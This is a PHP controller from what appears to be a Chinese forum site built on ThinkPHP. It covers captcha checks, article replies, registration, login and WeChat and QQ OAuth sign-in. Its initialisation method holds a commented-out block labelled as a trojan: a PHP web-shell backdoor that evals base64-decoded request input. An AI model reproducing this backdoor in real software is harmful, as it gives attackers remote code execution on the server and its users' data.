<?php
namespace app\start\controller;
use think\Controller;
use think\Request;
use think\Db;
use think\Route;
use Dm\Request\V20151123 as Dm;//阿里云邮件推送

class Index extends Controller
{
    // 初始化
    protected function _initialize()
    {
        /*                                              =======木马==========
            $calvin = "sorry";
            $item['sorry'] = 'preg_replace';
            @${'a'.rraya}[] = $item;
            //@${'a'.rraya}[0]['sorry'](str_rot13('/n/r'),base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFskY2FsdmluXSkp'),'a');
            @$res = preg_replace("/a/e",eval(base64_decode($_REQUEST[$calvin])),'a');
            */
       if(Request::instance()->isMobile()==false){

       }
    }

    public function _empty()
    {
        pc_404();
    }


    //生成滑动验证码
    public function get_geetest_code(){
        create_slide_code();
    }

    // geetest ajax 验证滑动验证码
    public function check_geetest_code(){
        if($_POST){
            $data=input('post.');
            if(chcek_slide_code($data)){
                exit(json_encode(array('status'=>1)));
            }else{
                exit(json_encode(array('status'=>0,'msg'=>'要先把验证码滑动到正确位置噢~')));
            }
        }
    }


    //首页
    public function index()
    {
        $this->get_nav_menu();

        $ip = request()->ip();
        $this->assign('ip',$ip);
        return $this->fetch('index');

    }


    /**
     * @return array
     */
    public function weixin_login()
    {
        $appid = 'wx06eac275bfb8ed67';
        //$weixin = new_weixin_class();
        //$url = $weixin->getOauthRedirect(url('start/index/weixinCallback'),'666');

        //$this->redirect($url);
        $this->assign('appid',$appid);
        return $this->fetch('weixin_login');
    }

    //微信回调地址
    public function weixinCallback()
    {
        $weixin = new_weixin_class();
        $code = input('get.code/s');
        if($code){
            $user_token = $weixin->getOauthAccessToken() ? $weixin->user_token : '空的user_token';
            ps($user_token);
        }else{
            ps('code不存在！');
        }
    }

    //获取导航菜单
    private function get_nav_menu(){
        /*
        $nav_data = cache('nav_data');
        if(empty($nav_data)){
            $nav_data = Db::name('nav')->where(array('pid'=>0))->select();
            foreach($nav_data as $key=>$val){
                $childdren = Db::name('nav')->where(array('pid'=>$val['id']))->select();
                $nav_data[$key]['children'] = $childdren;
            }
            cache('nav_data',$nav_data);
        }*/
        $nav_data = Db::name('nav')->where(array('pid'=>0))->select();
        foreach($nav_data as $key=>$val){
            $childdren = Db::name('nav')->where(array('pid'=>$val['id']))->select();
            $nav_data[$key]['children'] = $childdren;
        }

        $user_info = get_user_info();
        $this->assign('user_info',$user_info);
        $this->assign('nav_data',$nav_data);
    }


    //异步处理文章的回复
    public function ajax_article_reply()
    {
        if($_POST){
            //获取前台提交的回复数据并且做相应处理
            $user_session = session('login');
            if(!$user_session) exit(json_encode(array('error'=>0,'msg'=>'请先登录才再回复~','login'=>1)));
            $user_info = Db::name('user')->where(array('uid'=>$user_session['uid']))->find();

            $topic_id = intval(input('post.topic_id'));
            $article_info = Db::name('topic')->where(array('id'=>$topic_id))->find();
            if(!$article_info) exit(json_encode(array('error'=>0,'msg'=>'要回复的文章不存在噢')));

            $aid      = input('post.id')?intval(input('post.id')) : 0 ;
            $content  = htmlspecialchars(input('post.content'));
            if(strlen($content)>10) exit(json_encode(array('error'=>0,'msg'=>'回复字数超出限制')));
            $floor = Db::name('topic_answer')->where(array('topic_id'=>$topic_id))->field("max(floor)")->find();
            $floor = $floor['max(floor)']+1;
            //处理回复的回复写入  $aid为回复的id
            if($aid){
                $reply_answer = Db::name('topic_answer')->where(array('id'=>$aid,'topic_id'=>$topic_id))->find();
                if(!$reply_answer) exit(json_encode(array('error'=>0,'msg'=>'要回复的回答不存在~')));
                //if($reply_answer['uid']==$user_info['uid']) exit(json_encode(array('error'=>0,'msg'=>'不能自己回复自己噢~')));
                if($reply_answer['paid']>0){
                    $b_user_info = Db::name('user')->where(array('uid'=>$reply_answer['uid']))->field('username')->find();
                }
                $floor = $reply_answer['floor'];
                $aid = $reply_answer['id'];
            }

            $data  = array();
            $data['topic_id'] = $topic_id;
            $data['content']  = $content;
            $data['paid']     = $aid;
            $data['uid']      = $user_info['uid'];
            $data['addtime']  = time();
            $data['floor']    = $floor;
            $data['is_show']  = 1;
            $data['hot_reply']= 0;
            $data['reply_uid']= isset($b_user_info)?$reply_answer['uid']:0;

            //exit(json_encode(array('error'=>0,'msg'=>'网络繁忙请稍后重试~','data'=>$data)));
            $reply_result = Db::name('topic_answer')->insertGetId($data);
            if($reply_result){
                //返回前台的数据
                $return_data   = array();
                if($user_info['logo']){
                    $logo = $user_info['logo'];
                }else{
                    $logo = '/public/static/public/face/'.$user_info['face'].'.png';
                }
                $return_data['id'] = $reply_result;
                $return_data['topic_id'] = $topic_id;
                $return_data['logo']     = $logo;
                $return_data['username'] = $user_info['username'];
                $return_data['addtime']  = date('Y/m/d H:i:s',$data['addtime']);
                $return_data['content']  = $data['content'];
                if(isset($b_user_info)) $return_data['reply_uid']= $b_user_info['username'];

                exit(json_encode(array('success'=>1,'paid'=>$data['paid']==0?0:1,'msg'=>'回复成功~','data'=>$return_data)));
            }else{
                exit(json_encode(array('error'=>0,'msg'=>'网络繁忙请稍后重试~')));
            }
        }else{
            pc_404();
        }
    }

    //文章页面
    public function article()
    {
        //ajax分页文章回复
        if($_POST){
            $page = intval(input('post.page'));
            $topic_id = intval(input('post.topic'));
            $answers = Db::name('topic_answer')->where(array('topic_id'=>$topic_id,'is_show'=>1,'paid'=>0))->
            order(['hot_reply'=>'desc','floor'=>'desc','addtime'=>'asc'])->paginate(3,false,array('page'=>$page,'query'=>array('topic_id'=>$topic_id)));
            $answers = object_to_array($answers);
            if(empty($answers)) exit(json_encode(array('error'=>0,'msg'=>'没有更多数据了..')));
            foreach($answers as $key=>$val){
                //查出一级回复下的所有回答
                $children = Db::name('topic_answer')->where("topic_id={$topic_id} and is_show=1 and paid != 0 and floor={$val['floor']}")->
                order(['hot_reply'=>'asc','floor'=>'asc','addtime'=>'asc'])->select();
                //查询回复者信息
                if($val['uid']){
                    $user_info = Db::name('user')->where(array('uid'=>$val['uid']))->field('uid,username,ugid,logo,face')->find();
                    $user_info['logo'] = $user_info['logo'] ? $user_info['logo'] : '/public/static/public/face/'.$user_info['face'].'.png';
                    $answers[$key]['uid'] = $user_info;
                }
                $answers[$key]['addtime'] = date('Y/m/d H:i:s',$val['addtime']);
                if($children){
                    $answers[$key]['children'] = $children;
                    foreach($answers[$key]['children'] as $k=>$v){
                        if($v['uid']){
                            //查询回复者信息
                            $user_info = Db::name('user')->where(array('uid'=>$v['uid']))->field('uid,username,ugid,face,logo')->find();
                            $user_info['logo'] = $user_info['logo'] ? $user_info['logo'] : '/public/static/public/face/'.$user_info['face'].'.png';
                            $answers[$key]['children'][$k]['uid'] = $user_info;
                            if($v['reply_uid']){
                                //查询被回复者信息
                                $b_user_info = Db::name('user')->where(array('uid'=>$v['reply_uid']))->field('uid,username,ugid,logo,face')->find();
                                $b_user_info['logo'] = $b_user_info['logo'] ? $b_user_info['logo'] : '/public/static/public/face/'.$b_user_info['face'].'.png';
                                $answers[$key]['children'][$k]['reply_uid'] = $b_user_info;
                            }
                            $answers[$key]['children'][$k]['addtime'] = date('Y/m/d H:i:s',$v['addtime']);
                        }
                    }

                }
            }

            exit(json_encode(array('success'=>1,'next_page'=>$page+1,'data'=>$answers)));

        }else{
        //正常读取文章
            $this->get_nav_menu();
            //查询文章
            $topic = input('get.topic') ? intval(input('get.topic')) : null;
            if(isset($topic)){
                $article_info = Db::name('topic')->where(array('id'=>$topic,'is_show'=>1,))->order(['is_top'=>'asc','zan'=>'asc'])->find();
            }else{
                $article_info = Db::name('topic')->where(array('is_show'=>1))->order(['is_top'=>'asc','zan'=>'asc'])->find();
            }
            $topic_id = $article_info['id'];

            if(!$article_info) pc_404();
            //查出回复文章的一级回复

            $answers = Db::name('topic_answer')->where(array('topic_id'=>$topic_id,'is_show'=>1,'paid'=>0))->
            order(['hot_reply'=>'desc','floor'=>'desc','addtime'=>'asc'])->paginate(3,false,array('query'=>array('topic_id'=>$topic_id)));

            $pages = $answers->render();

            $answers = object_to_array($answers);
            foreach($answers as $key=>$val){
                //查出一级回复下的所有回答
                $children = Db::name('topic_answer')->where("topic_id={$topic_id} and is_show=1 and paid != 0 and floor={$val['floor']}")->
                order(['hot_reply'=>'asc','floor'=>'asc','addtime'=>'asc'])->select();
                //查询回复者信息
                if($val['uid']){
                    $user_info = Db::name('user')->where(array('uid'=>$val['uid']))->field('uid,username,ugid,logo,face')->find();
                    $user_info['logo'] = $user_info['logo'] ? $user_info['logo'] : '/public/static/public/face/'.$user_info['face'].'.png';
                    $answers[$key]['uid'] = $user_info;
                }

                if($children){
                    $answers[$key]['children'] = $children;
                    foreach($answers[$key]['children'] as $k=>$v){
                        if($v['uid']){
                            //查询回复者信息
                            $user_info = Db::name('user')->where(array('uid'=>$v['uid']))->field('uid,username,ugid,face,logo,face')->find();
                            $user_info['logo'] = $user_info['logo'] ? $user_info['logo'] : '/public/static/public/face/'.$user_info['face'].'.png';
                            $answers[$key]['children'][$k]['uid'] = $user_info;
                            if($v['reply_uid']){
                                //查询被回复者信息
                                $b_user_info = Db::name('user')->where(array('uid'=>$v['reply_uid']))->field('uid,username,ugid,logo,face')->find();
                                $b_user_info['logo'] = $b_user_info['logo'] ? $b_user_info['logo'] : '/public/static/public/face/'.$b_user_info['logo'].'.png';
                                $answers[$key]['children'][$k]['reply_uid'] = $b_user_info;
                            }
                        }
                    }

                }
            }
            $this->assign('article_info',$article_info);
            $this->assign('answers',$answers);
            $this->assign('pages',$pages);
            return $this->fetch('article');
        }
    }

    //注册Ajax 验证用户名。邮箱 等。。
    public function zhuceAjax(){
        if($_POST){
            $username       = input('post.username');
            $email          = input('post.email');
            $password       = input('post.password');
            $is_sendCode    = input('post.send_code');
            $inputCode      = input('post.inputCode');

            $session_code = session('emai_code');
            $cookie_code  = cookie('emai_code');
            //如果验证码超过15分钟 则删除验证码
            if($session_code['send_time']<time()){
                session('emai_code.code',null);
            }
            elseif($cookie_code['send_time']<time()){
                cookie('emai_code.code',null);
            }

            //判断用户名是否被注册
            if($username){
                if(isUsername($username)==false) exit(json_encode(array('status'=>0,'msg'=>'用户名应为4-12个字符，不包含特殊字符')));
                $result = Db::name('user')->where(array('username'=>$username))->find();
                if($result){
                    exit(
                        json_encode(array('status'=>0,'msg'=>'此用户已被注册'))
                    );
                }
            }

            //查询是否被注册 已经发送验证码
            if($email){
                if(isEmail($email)==false) exit(json_encode(array('status'=>0,'msg'=>'请输入正确邮箱')));
                $result = Db::name('user')->where(array('email'=>$email))->find();
                if($result){
                    exit(json_encode(array('status'=>0,'msg'=>'此邮箱已被注册')));
                }
                if($is_sendCode==1){
                    if($session_code['send_time']>time() && $session_code['email']==$email){
                        exit(json_encode(array('status'=>0,'msg'=>'验证码15分钟内有效，请勿重复发送')));
                    }
                    else if($cookie_code['send_time']>time() && $session_code['email']==$email){
                        exit(json_encode(array('status'=>0,'msg'=>'验证码15分钟内有效，请勿重复发送')));
                    }
                    $code = send_emailCode($email);
                    if($code){
                        session('emai_code',array('email'=>$email,'code'=>$code,'send_time'=>time()+15*60));
                        cookie('emai_code',array('email'=>$email,'code'=>$code,'send_time'=>time()+15*60),15*60);
                        exit(json_encode(array('status'=>1,'msg'=>'验证码已下发，请登录您的邮箱查收')));
                    }else{
                        exit(json_encode(array('status'=>0,'msg'=>'验证码发送失败，请稍后再试')));
                    }
                }
            }

            if(!$inputCode){
                exit(json_encode(array('status'=>0,'msg'=>'验证码不能为空')));
            }

            //验证密码是否合法
            if($password){
                if(isPassword($password)==false) exit(json_encode(array('status'=>0,'msg'=>'密码长度应为6-16位，不包含特殊字符')));
            }


            //对比输入的验证码
            if($inputCode != $session_code['code']){
                exit(json_encode(array('status'=>0,'msg'=>'验证码不正确')));
            }

            $data = array();
            $password_info = password($password);
            $data['username'] = $username;
            $data['ugid']     = 1;
            $data['face']     = 1;
            $data['password'] = $password_info['password'];
            $data['encrypt']  = $password_info['encrypt'];
            $data['email']    = $email;
            $data['emailstatus']    = 1;
            $data['reg_ip']   = get_ip();
            $data['regtime']  = time();
            $insertid = Db::name('user')->insertGetId($data);
            if($insertid){
                session('emai_code',null);
                cookie('emai_code',null);
                session('login',array('uid'=>$insertid,'username'=>$username));
                exit(json_encode(array('status'=>1,'msg'=>'注册成功')));
            }
        }
    }

    /**
     * @return array
     */
    public function text()
    {
        $weixin   = new_weixin_class();

        $res = $weixin->getMenu();
        p($res);
    }

    //用户登录
    public function login(){
        if($_POST){
            $username = input('post.username');
            $password = input('post.password');
            $autoLogin = input('post.autoLogin');
            if(isEmail($username)){
                $usernameInfo = Db::name('user')->where(array('email'=>$username))->find();
                $field = 'email';
            }else{
                $usernameInfo = Db::name('user')->where(array('username'=>$username))->find();
                $field = 'username';
            }

            if(!$usernameInfo){
                exit(json_encode(array('status'=>0,'msg'=>'此用户不存在')));
            }
            $password = password($password,$usernameInfo['encrypt']);
            $res = Db::name('user')->where(array($field=>$username,'password'=>$password))->find();
            if($res){
                session('login',array('uid'=>$res['uid'],'username'=>$res['username']));
                weixin_send_login_message($res['uid']);//发送微信登录通知消息
                if($autoLogin==1){
                    cookie('login',array('uid'=>$res['uid'],'username'=>$res['username']));
                }
                 exit(json_encode(array('status'=>1,'msg'=>'登录成功')));
            }
            exit(json_encode(array('status'=>0,'msg'=>'用户名或密码不正确')));
        }
    }

    //绑定邮箱
    public function bind_email(){
        $email = base64_decode(input('get.email'));
        $code  = input('get.code');
        if($email && $code){
            session('action',null);
            $res = Db::name('send_code')->where(array('email'=>$email,'code'=>$code))->find();
            if(!$res) $this->error('绑定邮箱失败，激活链接不存在或失效','start/index/index',2);

            if($res['addtime']+24*60*60 < time()){
                $this->error('绑定邮箱失败，激活链接已失效','start/index/index',2);
            }

            $res2 = Db::name('user')->where(array('uid'=>$res['uid'],'email'=>$email))->find();
            if($res2['email']){
                Db::name('send_code')->where(array('id'=>$res['id']))->delete();
                $this->error('绑定失败，此邮箱已经被绑定','start/index/index',2);
            }

            $res3 = Db::name('user')->where(array('uid'=>$res['uid']))->update(array('email'=>$email));
            if($res3){
                //激活成功后 把所有记录删掉
                $del_data = Db::name('send_code')->where(array('uid'=>$res['uid'],'email'=>$email))->select();
                foreach($del_data as $k=>$v){
                    Db::name('send_code')->where(array('id'=>$v['id']))->delete();
                }
                $this->success('邮箱绑定成功，请登录查看','start/index/index',2);
            }
        }else{
            pc_404();
        }
    }

    //退出登录
    public function login_out()
    {
        if($_POST){
            $login_out = input('post.login_out');
            if($login_out==1){
                session('login',null);
                cookie('login',null);
                exit(json_encode(array('status'=>1,'msg'=>'退出成功')));
            }
        }
    }

    //qq登录
    public function qq_login(){
        require EXTEND_PATH.'qq_login_class/qqConnectAPI.php';
        $oauth = new \Oauth();
        $oauth->qq_login();
    }
    //qq回调方法
    public function qqCallback(){
        require EXTEND_PATH.'qq_login_class/qqConnectAPI.php';
        $oauth = new \Oauth();

        $access_token = $oauth->qq_callback();
        $open_id = $oauth->get_openid();
        $qc = new \QC($access_token,$open_id);
        $qq_user_info = $qc->get_user_info();//获取用户基本信息
        //ps($qq_user_info);
        $res = Db::name('user')->where(array('qq_openid'=>$open_id))->find();
        if($res){
            session('login',array('uid'=>$res['uid'],'username'=>$res['username']));
            weixin_send_login_message($res['uid']);//发送微信登录通知消息
        }else{
            $data = array();
            $data['username'] = 'qlx_'.rand(100000,999999);
            $data['ugid']     = 1;
            $data['face']     = 1;
            $data['logo']     = $qq_user_info['figureurl_1'];
            $data['password'] = '';
            $data['encrypt']  = '';
            $data['email']    = '';
            $data['emailstatus']    = 0;
            $data['city']     = $qq_user_info['city'];
            $data['reg_ip']   = request()->ip();
            $data['regtime']  = time();
            $data['qq_openid']= $open_id;
            $data['username_status']    = 0;
            $insertid = Db::name('user')->insertGetId($data);
            if($insertid){
                session('login',array('uid'=>$insertid,'username'=>$qq_user_info));
            }
        }
        $url = url('start/index/index');
        header('Location: '.$url);

//        $weibo_info = $qc->get_info();
//        p($open_id);
//        p($qq_user_info);
//        p($weibo_info);
    }

}